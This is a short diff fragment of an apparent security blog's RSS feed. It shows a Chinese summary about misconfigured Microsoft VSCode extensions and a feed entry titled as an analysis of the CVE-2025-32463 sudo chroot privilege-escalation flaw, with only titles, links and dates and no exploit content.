+&lt;p&gt;本文展示了即使微软官方扩展也可能存在严重配置错误。在后续文章中，我们将分析一个能绕过所有正确配置的VSCode本体漏洞。&lt;/p&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
         <title>CVE-2025-32463漏洞利用：Sudo chroot本地提权漏洞分析</title>
         <link>http://localhost:1313/p/cve-2025-32463%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8sudo-chroot%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
         <pubDate>Fri, 08 Aug 2025 03:01:33 +0800</pubDate>
